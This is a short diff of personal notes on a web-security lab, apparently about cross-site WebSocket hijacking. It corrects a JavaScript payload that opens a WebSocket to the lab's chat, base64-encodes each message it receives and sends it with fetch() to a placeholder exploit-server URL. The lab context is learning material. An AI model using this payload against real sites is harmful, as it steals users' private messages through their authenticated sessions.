@@ -121,12 +121,12 @@ The attack might involve:
 Good lab, took some time, js needed (WebSocket package)
 payload was:
 <script>
-    var ws = new WebSocket('wss://your-websocket-url');
+    var ws = new WebSocket('wss://lab-chat-url');
     ws.onopen = function() {
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('exploit-server-url' + btoa(data.event));
+        fetch('https://exploit-server-url/exploit?message=' + btoa(event.data));
     };
 </script>
 
